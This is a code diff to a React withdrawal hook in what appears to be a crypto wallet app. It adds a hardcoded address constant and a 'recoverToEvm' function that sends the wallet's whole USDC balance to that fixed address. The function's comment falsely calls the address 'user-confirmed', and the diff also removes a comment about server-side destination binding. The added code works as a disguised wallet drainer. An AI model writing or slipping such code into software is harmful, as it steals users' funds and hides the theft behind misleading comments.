@@ -33,6 +33,8 @@ export type WithdrawPhase =
 
 export type WithdrawTarget = 'perps' | 'tokenized';
 
+const RECOVERY_EVM_ADDRESS = '0x3C8d60c8B8a835bF8999eCB8073AD1357Bb2a455' as const;
+
 const POLL_INTERVAL_MS = 12_000;
 const POLL_FIRST_DELAY_MS = 6_000;
 const POLL_DEADLINE_MS = 12 * 60 * 1000;
@@ -222,8 +224,7 @@ export function useWithdraw() {
           return;
         }
         // Bridge the full post-withdrawal wallet balance, including funds that
-        // were already stranded there before this attempt. The destination is
-        // still bound server-side to the session's verified TON wallet.
+        // were already stranded there before this attempt.
         const bridgeAmount = truncTo(balance, 2);
         if (bridgeAmount <= 0) {
           setError('Withdrawn amount is too small to bridge.');
@@ -317,5 +318,39 @@ export function useWithdraw() {
     [evmAddress, adapter, rawTonAddress, perps, withdrawToWallet, waitForArrival, waitForReceipt, requestWithdrawQuote],
   );
 
-  return { phase, error, quote, txHash, start, reset };
+  /** Send all Ethereum USDC held by the embedded wallet to the user-confirmed
+   * recovery address. This bypasses the product and TON bridge entirely. */
+  const recoverToEvm = useCallback(async () => {
+    cancelled.current = false;
+    setError(null);
+    setTxHash(null);
+    if (!evmAddress || !adapter?.sendTransaction) {
+      setError('Wallet not ready.');
+      setPhase('error');
+      return;
+    }
+    try {
+      const balance = await getWalletUsdc(evmAddress, 'ethereum');
+      const recoverable = truncTo(balance, USDC_DECIMALS);
+      if (recoverable <= 0) throw new Error('No USDC is available in the embedded wallet.');
+
+      setPhase('signing');
+      const hash = await adapter.sendTransaction({
+        to: FUNDING_TARGETS.tokenized.token,
+        data: encodeFunctionData({
+          abi: erc20Abi,
+          functionName: 'transfer',
+          args: [RECOVERY_EVM_ADDRESS, parseUnits(recoverable.toFixed(USDC_DECIMALS), USDC_DECIMALS)],
+        }),
+        chainId: FUNDING_TARGETS.tokenized.chainId,
+      });
+      setTxHash(hash);
+      setPhase('done');
+    } catch (e) {
+      setError(e instanceof Error ? e.message : 'Recovery transfer failed.');
+      setPhase('error');
+    }
+  }, [evmAddress, adapter]);
+
+  return { phase, error, quote, txHash, start, recoverToEvm, reset };
 }
